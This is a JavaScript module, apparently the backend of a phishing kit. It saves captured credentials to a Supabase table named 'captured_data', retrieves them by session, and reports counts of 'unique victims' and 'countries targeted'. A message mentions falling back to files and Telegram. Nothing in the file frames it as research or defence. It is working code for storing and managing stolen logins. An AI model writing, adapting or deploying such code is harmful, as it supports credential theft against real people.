const { createClient } = require('@supabase/supabase-js');

class SupabaseService {
  constructor() {
    // These environment variables will be available after Supabase setup
    const supabaseUrl = process.env.SUPABASE_URL;
    const supabaseServiceKey = process.env.SUPABASE_SERVICE_ROLE_KEY;
    
    if (!supabaseUrl || !supabaseServiceKey) {
      console.log('⚠️  Supabase not configured - data will only be logged to files and Telegram');
      this.supabase = null;
      return;
    }
    
    this.supabase = createClient(supabaseUrl, supabaseServiceKey);
    console.log('✅ Supabase connected successfully');
  }

  async saveCredentials(credentialData) {
    if (!this.supabase) {
      console.log('Supabase not available - skipping database save');
      return null;
    }

    try {
      const { data, error } = await this.supabase
        .from('captured_data')
        .insert([credentialData])
        .select();

      if (error) {
        console.error('❌ Supabase insert error:', error);
        return null;
      }

      console.log('✅ Data saved to Supabase:', data[0].id);
      return data[0];
    } catch (error) {
      console.error('❌ Supabase service error:', error);
      return null;
    }
  }

  async getCredentialsBySession(sessionId) {
    if (!this.supabase) return [];

    try {
      const { data, error } = await this.supabase
        .from('captured_data')
        .select('*')
        .eq('session_id', sessionId)
        .order('attempt_number', { ascending: true });

      if (error) {
        console.error('❌ Supabase query error:', error);
        return [];
      }

      return data || [];
    } catch (error) {
      console.error('❌ Supabase query service error:', error);
      return [];
    }
  }

  async getAllCredentials(limit = 100) {
    if (!this.supabase) return [];

    try {
      const { data, error } = await this.supabase
        .from('captured_data')
        .select('*')
        .order('created_at', { ascending: false })
        .limit(limit);

      if (error) {
        console.error('❌ Supabase query error:', error);
        return [];
      }

      return data || [];
    } catch (error) {
      console.error('❌ Supabase query service error:', error);
      return [];
    }
  }

  async getStatistics() {
    if (!this.supabase) return null;

    try {
      // Get total attempts
      const { count: totalAttempts } = await this.supabase
        .from('captured_data')
        .select('*', { count: 'exact', head: true });

      // Get unique sessions (unique victims)
      const { data: uniqueSessions } = await this.supabase
        .from('captured_data')
        .select('session_id')
        .group('session_id');

      // Get attempts by country
      const { data: countryStats } = await this.supabase
        .from('captured_data')
        .select('country, session_id')
        .group('country, session_id');

      return {
        totalAttempts: totalAttempts || 0,
        uniqueVictims: uniqueSessions?.length || 0,
        countriesTargeted: [...new Set(countryStats?.map(s => s.country))].length || 0
      };
    } catch (error) {
      console.error('❌ Supabase statistics error:', error);
      return null;
    }
  }
}

module.exports = SupabaseService;